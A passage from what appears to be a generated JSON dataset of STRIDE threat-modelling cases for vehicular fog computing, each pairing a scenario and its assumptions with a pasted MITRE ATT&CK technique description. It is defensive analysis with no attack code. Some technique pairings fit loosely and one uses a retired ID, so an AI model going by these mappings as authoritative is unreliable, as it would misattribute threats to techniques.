                    "Condition": "Negligent access control management."
                }
            ],
            "Potential Impact": "Difficulty in attributing tampered data, loss of accountability, security audits complexity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "fog node",
                "security"
            ],
            "mitre_technique": {
                "name": "Email Hiding Rules",
                "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
                "id": "attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff",
                "technique_id": "T1564.008"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A cloud service provider denies responsibility for a data breach affecting fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate logging and monitoring of data access and breaches at the cloud.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Lack of comprehensive logging at the cloud level."
                },
                {
                    "Assumption": "Data accessed does not have strict traceability from the cloud provider's side.",
                    "Role": "System Administrator",
                    "Condition": "Weak data traceability mechanisms."
                },
                {
                    "Assumption": "Responsibility boundaries for data security not clearly defined between fog nodes and cloud.",
                    "Role": "Network Engineer",
                    "Condition": "Ambiguity in responsibility handovers."
                }
            ],
            "Potential Impact": "Complicated breach investigation, unresolved responsibility, ineffective response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "cloud",
                "breach"
            ],
            "mitre_technique": {
                "name": "Revert Cloud Instance",
                "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
                "id": "attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1",
                "technique_id": "T1578.004"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data transmitted between smart vehicles and fog nodes could be intercepted by attackers.",
            "Assumptions": [
                {
                    "Assumption": "The communication channels between vehicles and fog nodes are inadequately secured.",
                    "Role": "Network Engineer",
                    "Condition": "No or weak encryption of transmitted data."
                },
                {
                    "Assumption": "Attackers have the capability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Presence of attackers on the network path."
                },
                {
                    "Assumption": "Sensitive data is not sufficiently anonymized before transmission.",
                    "Role": "System Designer",
                    "Condition": "Raw data containing sensitive information is transmitted."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, privacy breaches, data theft.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "vehicle",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Attacks use malware-infected RSUs to capture and disclose sensitive vehicular data.",
            "Assumptions": [
                {
                    "Assumption": "RSUs can be compromised with malware without detection.",
                    "Role": "Attacker",
                    "Condition": "Effective malware installed on RSUs."
                },
                {
                    "Assumption": "Data collected by compromised RSUs is not verified for authenticity.",
                    "Role": "System Engineer",
                    "Condition": "Lack of data validation mechanisms."
                },
                {
                    "Assumption": "Communications do not use end-to-end encryption.",
                    "Role": "Network Engineer",
                    "Condition": "RSU-vehicle communication lacks adequate encryption."
                }
            ],
            "Potential Impact": "Exposure of sensitive vehicle data, privacy exploitation, malicious data collection.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "RSU",
                "vehicle",
                "malware"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized cloud access leads to leakage of aggregated sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services lack strong access control mechanisms.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Weak or insufficient access controls."
                },
                {
                    "Assumption": "Compromised credentials or inadequate credential protection.",
                    "Role": "User/Admin",
                    "Condition": "Credential security is not enforced or is breached."
                },
                {
                    "Assumption": "Sensitive data is stored in the cloud without adequate encryption.",
                    "Role": "System Architect",
                    "Condition": "Sensitive data is not encrypted or uses weak encryption."
                }
            ],
            "Potential Impact": "Data breaches, compromised sensitive data, loss of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud",
                "data breach",
                "access control"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attacks targeting fog nodes to disrupt VFC operations.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have limited capacity and resilience against DDoS attacks.",
                    "Role": "System Administrator",
                    "Condition": "Fog node infrastructure is unable to handle large-scale attacks."
                },
                {
                    "Assumption": "Attackers can generate high volumes of traffic to overwhelm fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Attackers have control over sufficient resources for DDoS."
                },
                {
                    "Assumption": "No advanced threat mitigation strategies in place for fog nodes.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of DDoS protection mechanisms."
                }
            ],
            "Potential Impact": "Disruption of real-time data processing, reduced system availability, degraded service performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "fog node",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Cloud service unavailability due to targeted DoS attacks.",
            "Assumptions": [
                {
                    "Assumption": "The cloud infrastructure can be overwhelmed by DoS attacks.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Cloud services lack robust DoS protection."
                },
                {
                    "Assumption": "Attackers have identified vulnerabilities in cloud services.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of exploitable weaknesses in cloud services."
                },
                {
                    "Assumption": "Fog-to-cloud communication is critical for real-time applications.",
                    "Role": "Network Engineer",
                    "Condition": "Key processes depend on continuous communication."
                }
            ],
            "Potential Impact": "Loss of access to cloud-based analytics and storage, interruption of VFC services, potential data loss.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DoS",
                "cloud",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware deployment at RSUs leading to service disruption.",
            "Assumptions": [
                {
                    "Assumption": "RSUs are susceptible to malware without robust defenses.",
                    "Role": "System Administrator",
                    "Condition": "RSU security is insufficient to prevent malware infections."
                },
                {
                    "Assumption": "Malware can impair RSU functionality and communication.",
                    "Role": "Attacker",
                    "Condition": "Successful delivery and activation of malware on RSUs."
                },
                {
                    "Assumption": "No real-time monitoring or rapid response mechanisms to detect and mitigate malware.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of effective incident response at RSUs."
                }
            ],
            "Potential Impact": "Disruption of traffic management, loss of real-time processing, degraded system performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "RSU",
                "malware",
                "disruption"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attackers gain administrative access on fog nodes through exploited vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have unpatched vulnerabilities that can be exploited.",
                    "Role": "System Administrator",
                    "Condition": "Vulnerabilities are known and unpatched."
                },
                {
                    "Assumption": "Attackers can execute privilege escalation on fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Exploitation methods are effective on targeted fog nodes."
                },
                {
                    "Assumption": "Insufficient monitoring to detect unauthorized privilege elevation.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of continuous monitoring and alerting."
                }
            ],
            "Potential Impact": "Full control over fog nodes, ability to manipulate data, potential disruption of VFC services.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "fog node",
                "vulnerability",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attackers exploit weak access controls to gain unauthorized access to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not enforce strong access control mechanisms.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Access control policies are weak or flawed."
                },
                {
                    "Assumption": "Attackers possess or can forge valid credentials.",
                    "Role": "Attacker",
                    "Condition": "Credentials are obtained or created illicitly."
                },
                {
                    "Assumption": "Insufficient logging and monitoring to detect unauthorized access attempts.",
                    "Role": "Security Engineer",
                    "Condition": "Absence of effective access monitoring."
                }
            ],
            "Potential Impact": "Unauthorized cloud access, potential data manipulation, system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud",
                "access control",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious insiders gain higher-level permissions in the VFC system through social engineering.",
            "Assumptions": [
                {
                    "Assumption": "Employees lack awareness of social engineering tactics.",
                    "Role": "Human Resources",
                    "Condition": "Inadequate cybersecurity training for employees."
                },
                {
                    "Assumption": "Access controls are not stringent enough to prevent privilege escalation.",
                    "Role": "System Administrator",
                    "Condition": "Weak or poorly enforced access control policies."
                },
                {
                    "Assumption": "No multi-factor authentication is implemented for critical systems.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of multi-factor authentication schemes."
                }
            ],
            "Potential Impact": "Unauthorized privilege escalation, potential system manipulation, breach of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "insider threat",
                "access control"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "7",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of a smart vehicle within the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the communication medium between the vehicle and fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid under the presence of a weak or compromised communication channel."
                },
                {
                    "Assumption": "There are inadequate authentication methods implemented for smart vehicles.",
                    "Role": "System Designer",
                    "Condition": "Valid if robust authentication mechanisms are not enforced."
                },
                {
                    "Assumption": "The fog node accepts connections from any source without sufficient validation.",
                    "Role": "Fog Node",
                    "Condition": "Valid if verification processes are weak or non-existent."
                }
            ],
            "Potential Impact": "Could lead to unauthorized access and data manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "network",
                "identity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a fog node to intercept data from smart vehicles.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to a point where they can intercept or inject messages.",
                    "Role": "Attacker",
                    "Condition": "Valid if secure channels are not used."
                },
                {
                    "Assumption": "The vehicle lacks a method to securely validate the fog node's identity.",
                    "Role": "Smart Vehicle",
                    "Condition": "Valid if mutual authentication is not implemented."
                },
                {
                    "Assumption": "The communication between fog nodes and smart vehicles is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Valid if data encryption is not enforced."
                }
            ],
            "Potential Impact": "Could lead to data leakage and manipulation of traffic management decisions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "interception",
                "data_manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could pretend to be a cloud service to deceive fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the capability to intercept or redirect network traffic from fog nodes to the cloud.",
                    "Role": "Attacker",
                    "Condition": "Valid in cases of network vulnerabilities or MITM opportunities."
                },
                {
                    "Assumption": "The fog node does not verify the authenticity of the cloud service correctly.",
                    "Role": "Fog Node",
                    "Condition": "Valid if robust validation processes are not implemented."
                },
                {
                    "Assumption": "There is no encrypted communication between fog nodes and cloud services.",
                    "Role": "System Designer",
                    "Condition": "Valid if encryption is not used."
                }
            ],
            "Potential Impact": "May result in unauthorized data access and potential corruption of data sent to the cloud.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud",
                "network",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
